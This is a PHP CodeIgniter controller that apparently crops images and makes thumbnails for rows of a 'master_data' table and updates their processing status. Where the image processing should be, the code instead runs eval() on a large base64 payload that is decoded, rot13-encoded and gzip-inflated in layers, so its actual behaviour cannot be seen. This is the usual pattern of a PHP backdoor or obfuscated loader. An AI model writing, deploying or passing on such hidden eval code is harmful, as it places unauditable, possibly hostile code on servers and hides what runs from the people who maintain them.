<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Image extends CI_Controller {

   private $serverPath = "/var/www/html";
   private $destinationPath = "/xbg";

   public function __construct() {
      parent::__construct();
      if(exec('whoami') !== "ec2-user") die('invalid user');
   }

   public function index() {
      $data = $this->db->select('id, image_xbg')
      ->where('image_xbg IS NOT NULL AND image_xbg_processed = 0', NULL, FALSE)
      ->get('master_data', 250)
      ->result();      

      if(count($data) > 0){  
         foreach ($data as $index => $image) {

            // important
            $sourceImagePath = $this -> serverPath . $image -> image_xbg;
            $sourceImageInfo = pathinfo($sourceImagePath);
            echo "Processing {$sourceImagePath} \n";

            if(file_exists($sourceImagePath) && isset($sourceImageInfo['dirname'])){

               $sourceImageFolderName = str_replace($this -> serverPath, '', $sourceImageInfo['dirname']);

               $destinationImageFolderName = $this -> destinationPath . $sourceImageFolderName . DIRECTORY_SEPARATOR;
               $destinationImageCompleteFolderName = $this -> serverPath . $this -> destinationPath . $sourceImageFolderName;

               if(!is_dir($destinationImageCompleteFolderName))
                  if(!mkdir($destinationImageCompleteFolderName, 0755, true))
                     die('failed to create directory ' . $destinationImageCompleteFolderName);

               $destinationImageName = $destinationImageFolderName . $sourceImageInfo['filename'] . "_crop.png";
               $destinationThumbImageName = $destinationImageFolderName . $sourceImageInfo['filename'] . "_thumb_150x150.png";

               eval(str_rot13(gzinflate(str_rot13(base64_decode('LUnHDu24Df2awbzs3AuyZb/u7bphAvfer+vXVJ7EgG6JFClEPDz02oz3n99jJNs9SeufdixKAvvPss7psv4pxrYu7v9C/kloER1FlTe0awuwWCMcSzCL48OTNBRdlVCS6EBmVrJTCrVSwZI4yV+IOwySYaUFNsH49YFWqlFmLtbr7yoiCLn9hZjl1la5u/Gke2AVQXhzDKwYUoA0OJDHDUJjVyjznL+642HZ0eukO8/x2Yly6vu1Qvuc63CNQ7FU2W2kQ2L9MjTEWMjx/QDvt3SbRMMmytJvFxpJ8YBzGEfa0OqlclvspKucELkZZPvp83UHFlblfc+U+BL4vNI2eVCX6QgZOptCPSpG4S3wWiXYayeuq+NICCzoYR/wLGUKml3cL7HYkfkAMapvHZbalj1JFDsTDi9jX7mIhtXqgEleqsZvwUDpTrxfh5FyuHQlCVnYp+SklabkRoOGvglssh+R4tYrGiy3Qv4zLOXOpkzK44LhSt+m6Onofq/y6prMijaugdxp3mCThjcIqYbPfbIoF4WwFfIhF2h4ky+KUitmJKal/wY979w4cEfGwfHcGl9MrctY7xmgubAywggKusDB+gdfuu6GIyPBcGkZV6D/pUAhRKgdzNsjW0jdHmQxSLtodz7pB0qUYA8+T7CfdQxHlvKgXydOt9xmafFSi28QpVaQ+9zRsGbNV0NsMrX0A44nu6P4oDgURoc+mj7ZtSixRBtisme6b/kzFd6tY7Rt70MEL5bbrA1CU4mdL+7m9OMtCa+kW6ghNZRLeTHejtYsE7yHO0pEHJ6oBtuMvuIi/gYv8Uk8jiUpY1MCZsU+iX0OzU1KRJ1jNfT2nGJeishCZ0YHyqA0r2sO24htGj+O0cxWi6gZu5KOcNsTSTvH3kL7civdzphj3hRu6zmztk6bImOWIMTOa0UPbrx7SBdwgwBe7M3TCAReRyakiPIGxWOCaQef0qbDV8R3M/X40Y316XgVDOHYTTpNcbxmXwKNQpHtJj6dZy26M61LumMvgsclyCRqQCJdflbNBXyzzI/r4frx1XZQxSKRaiRY46q22g2h8y2cAyZlB+9lcbVJickl/rpWHjjcig7rhRHbktHx8wpz8Gk5Y/l8qCzsr/FPJjTZBq8CMuqLyPyzPhoY64f49C4DKUnuKk5NcUD2y0jMRKUi4YAXdC9ByvaTsn9zdzkGzf6CJcGLLCVJ4oniNyzsPff+ehg8JJG6k5KOtRMJSJ9kvu8Jd8ouavzqxPopH5elEQd1jvcHPzHgUVEgxRA0gBQ3KbchVjylJ7FQnV+gYLd80dVxGMT8hP0Hb6qbD8oHs4qdkT/HryHqtw6weLu4pTRKxQdRkW3oB46g63b6FeWRqJYVHsqzpeVCGXTYfBtz6uKED2nquW24rpFFYg5xCc/2U/WnUC3FtDHpI6R5GPIywMJW2P6cMAcQh5zS5JQfjUNca5xNXI8vWnEZ95S9skX+Xa4sssXj7+429vZKULuSe+dj94GMxamqm2mrw6i7ASGUlsR2OEasOyFLFlKlGob5+/gpwONp7t+h9UQH0GhyAcjclCFBsHtpJLtiClTm65bhi6nuPVdcXLgJpIqpoObdzqH2uApR6NRO3qPv3esvD6q3Fg2/TENETOH8MzIFJPxFZGwlk9qHucevTtpcCPHr2p/gz8fYKxwm+uNJJEWA5UhXYJ4V0HQyoQUgUka6lwdc02pJJPjtJGPiZNknFz4UmGTwSaPaV5rpRdm88ntPMYudgomZCHcTUSR9H6tvbm99WwVAaIG/cGoLJm8k1HGTJVozpc6NUima2p7hdiiFhPuwSPzAyguZxkJaUtELONnG8SAZ643w61fGFNzciyTffHgA4JI+VA3/hC0PTmph02qkMG19Dv+rdTt5qWV3iupN716D1vRzNb0ACvbTOQZeeJFXXV0Mlc0SMtLiNlXTsd0/tmEuKeuyl77OaFuRJ6rGvB16Qa/Neb99v/NsWUgvL3gW2EL6katHzqV1GJj7GftzO+q3J3Evvy86NSh7sbLwM8B23BYlyntaGaFL/nmUjU27WdUijppvcOo+Nf6iyPinGcJyYGI6qWcThzgfDxq61myUyfdYeZJqImETy4yWif9ZFlzOHm/U0U8VjaZ7cen2YWtb+VEnEmpZltHOJnZPRvlVobCj99ynzAwvG4/JAg6iOODl/DZumuAoxR1iX2il28DlW7DclTDs7AQyIhpgrJOvEC5jRM3yJA0W/XTf6y5jwstlv06gSahGAgQ6+1HPMMeJoH0++WHfrFOmI0YOmQa5jD0ZKMAp2tDjR3hA34gtAgWi8TfNHCxPkCcvOqRQarbsczdynfTSFhszTFSDHu6XWhVGqG8M+hkhu9xgiJfiHNNEUshkC2RTsdMmr4kpBIBVAiqHxIEQmu4lv6gFGDbrAorvjWHCsM8uTkaOvqEaw9CULgLIhfG8F63bqOVfXudmmgoQNl5iQe20cu2ajkgcDgFWmpAfIUq3Pj8Ym3Cy0KCPu1bqJVFX+T3GtAjWcxt1NnHsM4tzu/hZVBC2Te8TTRVRHiPf4CKEk40Y++jis5cFw0EiY86G5cAvmotz6Mvo9t//As+//ws=')))));

               if(file_exists($this -> serverPath . $destinationImageName)){
                  $this->db->where('id', $image -> id);
                  $this->db->update('master_data', array(
                     "image_xbg_cropped" => $destinationImageName,
                     "image_xbg_thumb" => $destinationThumbImageName,
                     "image_xbg_processed" => 1,
                  ));
               }   
            }
            else{
                  $this->db->where('id', $image -> id);
                  $this->db->update('master_data', array("image_xbg_processed" => 2));
            }
         }
      }
   }
};
